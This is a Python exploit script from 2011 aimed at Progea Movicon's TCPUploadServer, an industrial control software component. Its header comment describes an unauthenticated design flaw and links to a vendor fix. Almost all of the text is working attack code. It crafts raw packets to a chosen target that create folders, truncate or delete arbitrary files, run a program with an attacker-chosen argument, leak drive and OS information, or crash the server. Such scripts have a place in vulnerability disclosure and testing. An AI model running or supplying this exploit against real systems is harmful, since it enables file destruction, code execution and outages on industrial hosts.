#!/usr/bin/python
# movi.py
# Progea Movicon TCPUploadServer Remote Exploit
# Jeremy Brown / jbrown at patchtuesday dot org
# Mar 2011
#
# TCPUploadServer allows remote users to execute functions on the server
# without any form of authentication. Impacts include deletion of arbitrary
# files, execution of a program with an arbitrary argument, crashing the
# server, information disclosure, and more. This design flaw puts the host
# running this server at risk of potentially unauthorized functions being
# executed on the system.
#
# Tested on Progea Movicon 11 TCPUploadServer running on Windows
#
# Fix: http://support.progea.com/download/Mov11.2_Setup.zip
#

import sys
import socket

hdr="MovX"

funcs=(1,2,3,4,5,6,7,8) # "B" is listed as 8 only for convience. other functions include (the real) 8, 9, A, and V

if len(sys.argv)<3:
     print "Progea Movicon TCPUploadServer Remote Exploit"
     print "Usage: %s <target> <function> [data]"%sys.argv[0]
     print "\nWhat would you like to do?\n"
     print "[1] Create a folder"
     print "[2] Overwrite a file with NULL and cause 100%% CPU"
     print "[3] Delete a file"
     print "[4] Execute moviconRunTime.exe with a specified argument"
     print "[5] Create a desktop shortcut"
     print "[6] Retrieve drive information"
     print "[7] Retrieve os service pack"
     print "[8] Crash the server\n"
     print "* Default data is \"test\""
     sys.exit(0)

target=sys.argv[1]
port=10651
cs=target,port

func=int(sys.argv[2])

if len(sys.argv)==4:
     data=sys.argv[3]
else:
     data="test"

if func not in funcs:
     print "Invalid function"
     sys.exit(1)

if(func==1):
     print "Crafting a packet to create the folder \"%s\"..."%data
     pkt=hdr+"1"+"B"+data+"\x00"*(66-len(data))

elif(func==2):
     print "Crafting a packet to truncate (or create) the file \"%s\" to 0 bytes and cause 100%% CPU..."%data
     pkt=hdr+"2"+"B"+data+"\x00"*(66-len(data))
     # O_RDWR|O_CREAT|O_TRUNC, might be more to this, it's supposedly a copy function, but i'm moving on

elif(func==3):
     print "Crafting a packet to delete the file \"%s\"..."%data
     pkt=hdr+"3"+"B"+data+"\x00"*(66-len(data))

elif(func==4):
     print "Crafting a packet to execute moviconRunTime.exe with the argument \"%s\"..."%data
     pkt=hdr+"4"+"BB"+data+"\x00"*(65-len(data))

elif(func==5):
     print "Crafting a packet to create a desktop shortcut with the name (also appended to the link path) \"%s\"..."%data
     pkt=hdr+"5"+"B"+data+"\x00"*(66-len(data))

elif(func==6):
     print "Crafting a packet to retrieve drive information..."
     pkt=hdr+"6"+"\x01"

elif(func==7):
     print "Crafting a packet to retrieve os service pack..."
     pkt=hdr+"7"+"\x00"

elif(func==8):
     print "Crafting a packet to crash the server..."
     pkt=hdr+"B"+"\x00"

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(cs)

sock.send(pkt)
sock.send(pkt)

print "\nPacket sent!"

if((func==6)|(func==7)):
     info=sock.recv(128)
     
     if(info):
          print "\nRetrieved info:\n"
          if(func==6):
               print "%s"%info[6:]
          elif(func==7):
               print "%s"%info[22:]
     else:
          print "\nNo info"

sock.close()
